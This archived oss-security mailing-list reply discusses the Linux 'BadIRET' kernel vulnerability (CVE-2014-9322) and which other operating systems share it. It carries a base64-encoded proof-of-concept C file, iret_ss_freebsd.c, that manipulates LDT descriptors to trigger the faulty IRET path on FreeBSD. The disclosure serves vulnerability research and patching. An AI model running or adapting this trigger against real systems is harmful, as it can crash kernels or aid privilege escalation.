X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5897" "Wednesday" "8" "July" "2015" "17:34:48" "-0700" "Andy Lutomirski" "luto@amacapital.net" "<559DC1A8.7000400@amacapital.net>" "114" "[oss-security] Re: Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)" nil nil nil "7" "2015070900:34:48" "[oss-security] Re: Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)" (number mark "U       luto@amacapi Jul  8  114/5897  " thread-indent "\"[oss-security] Re: Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)\"\n") "<20150704072348.GA24700@pi3.com.pl>" ("<20150704072348.GA24700@pi3.com.pl>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19726 invoked by uid 550); 9 Jul 2015 00:35:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19664 invoked from network); 9 Jul 2015 00:35:03 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:subject:to:references:from:message-id:date
         :user-agent:mime-version:in-reply-to:content-type;
        bh=STS4gFWdJdt/ahsMgr0O5VPFD6oNPFFWQNwPtvj5byg=;
        b=DUArukOXXkKaaxMjpE6Bb7A7XyN4+43XIDTIX4LknUXoLXyuCUqPZTTBSQJGzqXtog
         befCQYGeBtvaAr1Xn0ZBgCFjNWjTzyapEI+UdzbLt0EHKi0mlnR9FlwgqF4rQkqRYitk
         5UaZyft30e8zQokMqRJMxo0VxokdZ5lEsjQylIZD4N0cTTtjJKro2Dmi9Tl6IIaTZkMp
         EH/vk2CchIn90rE84t5BNL0T9Wv0G3ThEeoc66i60izgKDLgITP5OVAs1qEDjPBtJoO7
         PXwd7lnIUhkrsHitq+1PI0sGNHvqutuFtLPJy5HoDfJuI1OFh1u3irqLG2eUxKFmaGu+
         YeBA==
X-Gm-Message-State: ALoCoQnfvB/miKj9mrQGELfL//BvgtfzYYITmWTMw9i3/kOKd761Zml9hsgjLq2d1FP8Bt2V59hq
X-Received: by 10.70.135.195 with SMTP id pu3mr25937979pdb.0.1436402091950;
        Wed, 08 Jul 2015 17:34:51 -0700 (PDT)
To: oss-security@lists.openwall.com
References: <20150704072348.GA24700@pi3.com.pl>
From: Andy Lutomirski <luto@amacapital.net>
Message-ID: <559DC1A8.7000400@amacapital.net>
Date: Wed, 8 Jul 2015 17:34:48 -0700
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.0.1
MIME-Version: 1.0
In-Reply-To: <20150704072348.GA24700@pi3.com.pl>
Content-Type: multipart/mixed;
 boundary="------------030902080000060903060202"
Subject: [oss-security] Re: Follow-up on Exploiting "BadIRET" vulnerability (CVE-2014-9322)

--------------030902080000060903060202
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit

On 07/04/2015 12:23 AM, Adam Zabrocki wrote:
> Hi,
>
> The journey into CVE-2014-9322 is not straightforward but it is worth to spend some time on it and analyze all available information. I will try my best...
>
>
> 1) Introduction - non-technical (almost)
>
> Everything starts from the CVE-2014-9090. This vulnerability was discovered by Andy Lutomirski which allows you (quoting MITRE):
>
> "The do_double_fault function in arch/x86/kernel/traps.c in the Linux kernel through 3.17.4 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to cause a denial of service (panic) (...)"
>
> which essentially may results in local DoS attack. It doesn't sounds so critical from the defender's point of view (but still it takes attention especially from the nature of vulnerability point of view) neither from the attackers perspective. Mainly because of the potential limited benefits after successful exploitation.
>
> The "fun" starts after Borislav Petkov asked some questions about CVE-2014-9090. Andy Lutomirski discovered another vulnerability in the same functionality which was masked by first one. (Un)fortunately this time it was very serious (I would say critical) flaw. Linux kernel does not properly handle faults associated with the Stack Segment (SS) register in the x86 architecture. Quoiting MITRE again:
>
> "(...) allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space."
>

Good writeup.

For what it's worth, there are two issues that combine to make the 
BadIRET bug interesting.

1. Linux mishandled #SS during IRET.  IRET can fail due to #SS, #NP, or 
#GP.  All x86_64 OS authors seem to have realized that #GP is possible, 
but #SS and #NP are easy to overlook.

2. Linux gives flexible enough control over the LDT to cause IRET to 
fail with #SS.  This is not a bug -- it just means that bug #1 matters. 
  (Linux used to allow this attack through the GDT as well, but I fixed 
that separately.)

One might reasonably wonder whether other OSes are affected by #1 or, 
more severely, by #1 and #2.  Here's my summary from memory:

FreeBSD was fully vulnerable.  See the attachment.  They seem to have 
fixed it, but I can't find an advisory.

OpenBSD appears to have bug #1 (or did, anyway -- I haven't checked 
recently), but AFAICT there is no way to modify the GDT or LDT at all on 
OpenBSD, so #2 isn't present and exploitation is impossible.

I think that Darwin had bug #1 but fixed it before I tried to exploit it 
(not sure when).  I don't remember whether Darwin has #2.

OpenSolaris had #1 but, due to a whole pile of complicated 
double-checks, I couldn't find any way to get #2, despite the fact that 
fairly extensive descriptor manipulation is possible.

I don't know about Windows.

Xen is unusual and doesn't seem to use SWAPGS, so the underlying issue 
doesn't exist.  That doesn't rule out the possibility of other bugs due 
to #NP or #SS, but Xen seems to survive my Linux test case.

I didn't check NetBSD, DragonFlyBSD, Mach, Hurd, or any of the L4 variants.

ESX could be an interesting target, although this would only make sense 
as part of an exploit chain or if paravirtual guests still exist and are 
enabled.

--Andy

--------------030902080000060903060202
Content-Type: text/plain; charset=UTF-8;
 name="iret_ss_freebsd.c"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename="iret_ss_freebsd.c"

LyoKICogQ29weXJpZ2h0IChjKSAyMDE0LTIwMTUgQW5keSBMdXRvbWlyc2tp
CiAqIEdQTCB2MgogKi8KCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8
dW5pc3RkLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPGVycm5v
Lmg+CiNpbmNsdWRlIDxlcnIuaD4KI2luY2x1ZGUgPG1hY2hpbmUvc2VnbWVu
dHMuaD4KI2luY2x1ZGUgPG1hY2hpbmUvc3lzYXJjaC5oPgoKc3RhdGljIHVu
c2lnbmVkIHNob3J0IEdEVDMoaW50IGlkeCkKewoJcmV0dXJuIChpZHggPDwg
MykgfCAzOwp9CgpzdGF0aWMgdW5zaWduZWQgc2hvcnQgTERUMyhpbnQgaWR4
KQp7CglyZXR1cm4gKGlkeCA8PCAzKSB8IDc7Cn0KCnN0YXRpYyB2b2lkIGRv
X2l0KHZvaWQpCnsKCWludCBheDsKCWludCBpZHg7Cgl1bnNpZ25lZCBzaG9y
dCBoYWNrX3NzLCBmaW5hbF9zczsKCgkvKgoJICogTWFrZSBhIHZhbGlkIGRl
c2NyaXB0b3IKCSAqLwoJdW5pb24gZGVzY3JpcHRvciBkZXNjOwoJbWVtc2V0
KCZkZXNjLCAwLCBzaXplb2YoZGVzYykpOwoJZGVzYy5zZC5zZF9sb2xpbWl0
ID0gMHhmZmZmOwoJZGVzYy5zZC5zZF90eXBlID0gU0RUX01FTVJXQTsKCWRl
c2Muc2Quc2RfZHBsID0gMzsKCWRlc2Muc2Quc2RfcCA9IDE7CglkZXNjLnNk
LnNkX2hpbGltaXQgPSAweGY7CglkZXNjLnNkLnNkX2dyYW4gPSAxOwoJZGVz
Yy5zZC5zZF9kZWYzMiA9IDE7CglpZHggPSBpMzg2X3NldF9sZHQoTERUX0FV
VE9fQUxMT0MsICZkZXNjLCAxKTsKCWlmIChpZHggPCAwKQoJICAJZXJyKDEs
ICJpMzg2X3NldF9sZHQiKTsKCglwcmludGYoIisgQWxsb2NhdGVkIExEVCBp
bmRleCAlZFxuIiwgaWR4KTsKCWhhY2tfc3MgPSBMRFQzKGlkeCk7CgoJLyog
dmFsaWQgYnV0IG5vdCBwcmVzZW50ICovCglkZXNjLnNkLnNkX3AgPSAwOwoK
CXByaW50ZigiKyBEcnkgcnVuIChzZXQgU1MgdG8gMHglaHgpLi4uICIsIGhh
Y2tfc3MpOwoJZmZsdXNoKHN0ZG91dCk7Cglhc20gdm9sYXRpbGUgKCJtb3Yg
JTAsJSVzcyIgOiA6ICJybSIgKGhhY2tfc3MpKTsKCXByaW50Zigib2tcbiIp
OwoJCglwcmludGYoIisgSGVyZSBnb2VzLi4uICIpOwoJZmZsdXNoKHN0ZG91
dCk7CgkKCWFzbSB2b2xhdGlsZSAoIm1vdiAlMCwlJXNzIiA6IDogInJtIiAo
aGFja19zcykpOwoKCS8qCgkgKiBObyBzeXNjYWxscyBiZWZvcmUgdGhlIGlu
dDgwIC0tIHVzZSBvZiBzeXNjYWxsIG9yIHN5c2VudGVyIHdpbGwKCSAqIHdp
cGUgU1MuCglhc20gdm9sYXRpbGUgKCJpbnQgJDB4ODAiCgkJICAgICAgOiAi
PWEiIChheCkKCQkgICAgICA6ICJhIiAoU1lTX21vZGlmeV9sZHQpLCAiYiIg
KDEpLCAiYyIgKCZkZXNjKSwKCQkJImQiIChzaXplb2YgZGVzYykpOwoJICov
CglpZiAoaTM4Nl9zZXRfbGR0KGlkeCwgJmRlc2MsIDEpIDwgMCkgewoJCXBy
aW50ZigiXG4iKTsKCQllcnIoMSwgImkzODZfc2V0X2xkdCIpOwoJfQoKCWFz
bSB2b2xhdGlsZSAoIm1vdiAlJXNzLCUwIiA6ICI9cm0iIChmaW5hbF9zcykp
OwoJcHJpbnRmKCJcbisgV2Ugc3Vydml2ZWQgd2l0aCBTUz0weCVoeC4gIFRo
YXQgc2hvdWxkbid0IGhhdmUgaGFwcGVuZWQuXG4iLAoJCWZpbmFsX3NzKTsK
fQoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQp7Cglkb19pdCgp
OwoJcmV0dXJuIDA7Cn0K

--------------030902080000060903060202--
